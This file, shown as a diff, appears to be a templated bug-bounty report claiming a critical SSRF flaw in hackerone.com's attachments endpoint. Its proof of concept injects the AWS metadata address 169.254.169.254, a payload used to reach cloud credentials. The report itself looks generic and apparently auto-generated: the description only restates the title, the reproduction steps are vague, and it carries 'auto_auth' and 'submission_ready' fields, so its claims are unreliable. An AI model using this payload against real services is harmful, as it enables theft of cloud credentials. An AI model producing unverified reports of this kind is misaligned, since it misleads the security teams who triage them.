@@ -1,0 +1,28 @@
+{
+  "report_id": "REPORT-54687",
+  "researcher": "Khallid Hakeem Nurse",
+  "program": "hackerone.com",
+  "vulnerability_type": "SSRF",
+  "severity": "Critical",
+  "cvss_score": 9.0,
+  "title": "SSRF in /api/v1/reports/{id}/attachments",
+  "description": "Discovered SSRF vulnerability in hackerone.com",
+  "steps_to_reproduce": [
+    "1. Send request to /api/v1/reports/{id}/attachments",
+    "2. Inject payload: http://169.254.169.254/latest/meta-data/",
+    "3. Observe vulnerability execution"
+  ],
+  "proof_of_concept": {
+    "request": "POST /api/v1/reports/123/attachments",
+    "payload": "http://169.254.169.254/latest/meta-data/",
+    "response": "200 OK - AWS metadata accessed",
+    "screenshot": "ssrf_evidence.png"
+  },
+  "impact": "Potential Critical security risk",
+  "remediation": "Validate and sanitize URLs in attachments",
+  "bounty_estimate": 15000,
+  "legal_authorization": "auto_auth_hackerone_com.json",
+  "compliance_verified": true,
+  "submission_ready": true,
+  "copyright": "\u00a9 2025 Khallid Hakeem Nurse"
+}
